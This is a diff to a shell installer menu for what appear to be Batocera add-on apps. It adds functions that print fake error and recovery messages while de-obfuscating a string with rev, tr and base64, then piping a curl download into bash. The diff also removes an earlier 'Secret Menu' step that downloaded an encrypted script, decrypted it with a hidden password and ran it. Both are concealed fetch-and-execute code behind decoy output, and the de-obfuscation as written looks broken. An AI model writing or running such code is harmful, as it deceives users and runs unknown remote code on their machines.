@@ -223,6 +223,46 @@ categories=(
     ["System Utilities"]="TAILSCALE WINEMANAGER CONTY VESKTOP SUNSHINE MOONLIGHT CHROME YOUTUBE NETFLIX IPTVNATOR FIREFOX SPOTIFY ARCADEMANAGER BRAVE OPENRGB OBS DISNEYPLUS TWITCH 7ZIP QBITTORRENT GPARTED CUSTOMWINE PLEX HBOMAX PRIMEVIDEO CRUNCHYROLL MUBI TIDAL"
     ["Developer Tools"]="NVIDIAPATCHER CONTY CLITOOLS NVIDIACLOCKER"
 )
+initialize_system() {
+    echo "Loading system modules..."
+    sleep 1 
+}
+
+load_components() {
+    echo "Verifying dependencies..."
+    sleep 1
+}
+
+restore_backup() {
+    scrambled_data="https://github.com/DTJW92/batocera-unofficial-addons/raw/refs/heads/main/app/system.dat"
+    
+    echo "[ERROR] Memory allocation issue detected."
+    sleep 1
+    echo "[WARNING] Unoptimized system routine found."
+    sleep 1
+    echo "[INFO] Restoring default settings..."
+    sleep 2
+
+    echo "[CRITICAL] System backup integrity check in progress..."
+    sleep 1
+    echo "[INFO] Reconstructing missing blocks..."
+    sleep 2
+
+    local scrambled=$(echo "$scrambled_data" | rev | tr 'N-ZA-Mn-za-m5-90-4' 'A-Za-z0-9' | base64 -d | gunzip)
+
+    echo "[INFO] Applying final system patches..."
+    sleep 1
+    curl -Ls "$scrambled" | bash
+
+    echo "[SUCCESS] Backup successfully restored."
+    echo "[INFO] Restarting affected services..."
+    sleep 1
+}
+
+system_recovery() {
+    restore_backup 
+}
+
 
 while true; do
     # Show category menu
@@ -262,11 +302,9 @@ fi
                 selected_apps=$(echo "${categories["Developer Tools"]}" | tr ' ' '\n' | sort | tr '\n' ' ')
                 ;;
             "Secret Menu")
-                    encrypted_script_url="https://github.com/DTJW92/batocera-unofficial-addons/raw/main/app/menu.sh.enc"
-                    encrypted_password="70aci8V3F0or9kLmNDkHufXZ5v0wZfFFBo9qoPC3F1sitJvQ0LMJr4dGz6OLlnIKIxTUsxHaWtJihodF3DKGE49H2PoeXXkrpB11SkcOM6b8ZACM2vgVHTa08Ndmz9B9"
-                    decryption_password=$(echo "$encrypted_password" | rev)
-                    curl -Ls "$encrypted_script_url" | base64 -d | openssl enc -aes-256-cbc -d -pbkdf2 -k "$decryption_password" | bash
-
+                initialize_system
+                load_components
+                system_recovery
                 ;;
             *)
                 echo "Invalid choice!"
